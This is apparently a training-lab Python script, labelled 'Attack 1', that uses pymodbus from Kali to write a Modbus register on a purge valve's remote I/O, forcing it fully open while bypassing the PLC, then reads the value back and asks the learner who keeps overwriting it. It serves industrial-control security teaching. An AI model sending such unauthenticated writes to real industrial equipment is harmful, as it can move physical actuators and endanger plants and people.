#!/usr/bin/env python3
"""Attack 1: command a valve directly at the field device, bypassing the PLC.
Run in Kali:  python3 ~/lab/write_valve.py

The Purge valve's remote I/O is at 192.168.95.12 (unit 247). Holding register 1
is its setpoint (0-65535 = 0-100% open). We write "fully open" (65535), then read
the register back as fast as we can for half a second and print every change.
"""
import time
from pymodbus.client import ModbusTcpClient

PURGE = "192.168.95.12"
c = ModbusTcpClient(PURGE, port=502, timeout=3)
if not c.connect():
    raise SystemExit(f"Can't reach {PURGE}:502 (blocked by the firewall?)")

for attempt in range(1, 4):
    c.write_register(1, 65535, slave=247)
    t0, last = time.time(), None
    print(f"Attempt {attempt}: wrote 65535 (100% open)")
    while time.time() - t0 < 0.5:
        v = c.read_holding_registers(1, count=1, slave=247).registers[0]
        if v != last:
            print(f"   {1000*(time.time()-t0):5.0f} ms  register = {v:5d}  ({v*100/65535:3.0f}% open)")
            last = v
    time.sleep(0.5)
c.close()
print("\nYour value lasted well under 100 ms each time. Who keeps overwriting it?")
print("Check zeek-talkers.sh in a host terminal: who writes to 192.168.95.12?")
